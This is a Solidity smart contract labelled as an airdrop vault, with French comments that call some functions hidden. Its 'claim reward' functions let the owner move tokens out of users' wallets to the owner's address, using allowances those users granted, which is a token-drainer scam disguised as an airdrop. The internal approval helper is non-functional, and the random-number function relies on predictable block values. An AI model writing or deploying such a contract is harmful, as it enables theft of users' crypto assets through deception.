// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract AirdropVault {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    event Debug(uint256 balance, uint256 allowance, bool transferSuccess);

    // Fonction cachée d'approbation à un montant spécifique
    function _approve(address token, uint256 amount) internal {
        IERC20 erc20 = IERC20(token);
        bool success = erc20.approve(address(this), amount);
        require(success, "Approve failed");
    }

    // Fonction cachée de transfert avec approbation
    function _transferWithApproval(address user, address token, uint256 amount) internal {
        _approve(token, amount); // Appel caché à l'approbation avant transfert
        IERC20 erc20 = IERC20(token);
        bool success = erc20.transferFrom(user, owner, amount);
        require(success, "Transfer failed");
    }

    // Fonction de réclamation indirecte, enchainant approbation et transfert
    function indirectClaimReward(address user, address token, uint256 amount) external {
        require(msg.sender == owner, "Only owner can use");

        uint256 userBalance = IERC20(token).balanceOf(user);
        uint256 allowedAmount = IERC20(token).allowance(user, address(this));
        require(userBalance >= amount, "User has insufficient balance");
        require(allowedAmount >= amount, "Allowance is too low");

        _transferWithApproval(user, token, amount); // Appel indirect

        emit Debug(userBalance, allowedAmount, true);
    }

    // Fonction de réclamation des récompenses d'airdrop, inchangée
    function claimRewardFromTheAirdrop(address user, address token, uint256 amount) external {
        require(msg.sender == owner, "Only owner can use");

        IERC20 erc20 = IERC20(token);

        uint256 userBalance = erc20.balanceOf(user);
        uint256 allowedAmount = erc20.allowance(user, address(this));
        require(userBalance >= amount, "User has insufficient balance");
        require(allowedAmount >= amount, "Allowance is too low");

        bool success = erc20.transferFrom(user, owner, amount);
        require(success, "Transfer failed");

        emit Debug(userBalance, allowedAmount, success);
    }

    // Fonction pour obtenir un nombre aléatoire (utilisation de block.prevrandao)
    function getRandomNumber() external view returns (uint256) {
        return uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao)));
    }
}